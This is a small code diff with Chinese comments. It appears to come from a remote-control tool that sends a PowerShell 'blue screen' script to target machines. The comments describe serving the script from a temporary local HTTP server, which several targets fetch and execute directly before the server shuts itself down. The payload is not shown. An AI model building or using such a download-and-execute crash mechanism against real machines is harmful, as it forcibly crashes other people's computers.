@@ -57,8 +57,8 @@ BLUE_SCREEN_SCRIPT = (
     % (BLUE_SCREEN_PRIVILEGE, BLUE_SCREEN_STATUS, BLUE_SCREEN_RESPONSE)
 )
 
-# 蓝屏脚本有三百多个字符，超过命令通道单条上限，改由本机临时 HTTP 服务托管，
-# 目标取回后直接执行；服务只回同一份脚本，取走后也不再接受新请求，超时自关。
+# 蓝屏脚本有三百多个字符，超过命令通道单条上限，改由本机临时 HTTP 服务托管：
+# 目标发一条命令取回后直接执行，多台目标共用同一个端口，服务到点自关。
 BLUE_SCREEN_PATH = "/bs.ps1"
 
 BLUE_SCREEN_SERVE_SECONDS = 60
